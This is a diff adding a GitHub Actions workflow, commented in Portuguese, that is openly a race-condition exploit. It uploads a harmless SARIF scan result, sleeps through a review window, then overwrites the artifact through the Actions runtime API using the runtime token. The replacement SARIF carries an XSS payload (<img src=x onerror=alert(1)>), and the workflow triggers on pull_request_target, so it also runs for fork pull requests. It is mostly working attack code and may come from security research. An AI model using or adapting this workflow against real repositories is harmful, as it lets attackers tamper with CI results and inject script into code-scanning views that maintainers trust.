@@ -1,0 +1,84 @@
+name: sarif-race
+
+#############################################################
+# Gatilhos
+#############################################################
+on:
+  # opcional: executa também para PRs vindos de forks
+  pull_request_target:
+
+  # botão “Run workflow” na UI
+  workflow_dispatch:
+    inputs:
+      wait_seconds:
+        description: "Tempo de espera antes de trocar o artefato (segundos)"
+        required: false
+        default: "120"
+
+#############################################################
+# Job único
+#############################################################
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: write   # preciso para upload de artefato
+
+    steps:
+      # ───── pega o valor de espera (ou aplica default) ─────
+      - name: Define tempo de espera
+        id: cfg
+        run: echo "WAIT=${{ github.event.inputs.wait_seconds || 120 }}" >> "$GITHUB_OUTPUT"
+
+      # ───── gera SARIF benigno e envia ─────
+      - name: Gera SARIF benigno
+        run: |
+          cat > result.sarif <<'SARIF'
+          {
+            "version": "2.1.0",
+            "runs": [{
+              "tool": { "driver": { "name": "demo" } },
+              "results": [{
+                "ruleId": "x",
+                "message": { "text": "OK" }
+              }]
+            }]
+          }
+          SARIF
+
+      - uses: actions/upload-artifact@v4
+        with:
+          name: scan
+          path: result.sarif
+
+      # ───── espera a janela para revisão/merge ─────
+      - name: Aguarda janela para revisão
+        run: sleep "${{ steps.cfg.outputs.WAIT }}"
+
+      # ───── sobrescreve artefato com payload XSS ─────
+      - name: Troca artefato por payload
+        run: |
+          # 1) cria SARIF malicioso
+          cat > pwn.sarif <<'SARIF'
+          {
+            "version": "2.1.0",
+            "runs": [{
+              "tool": { "driver": { "name": "demo" } },
+              "results": [{
+                "ruleId": "x",
+                "message": { "text": "<img src=x onerror=alert(1)>" }
+              }]
+            }]
+          }
+          SARIF
+
+          # 2) limpa newline e “/” extra no ACTIONS_RUNTIME_URL
+          CLEAN_URL=$(printf '%s' "$ACTIONS_RUNTIME_URL" | tr -d '\n\r')
+          CLEAN_URL=${CLEAN_URL%/}
+
+          # 3) envia overwrite
+          curl -sSf -X PUT \
+            -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" \
+            -H "Content-Type: application/octet-stream" \
+            --data-binary @pwn.sarif \
+            "$CLEAN_URL/_apis/pipelines/workflows/$GITHUB_RUN_ID/artifacts?artifactName=scan&api-version=6.0-preview"
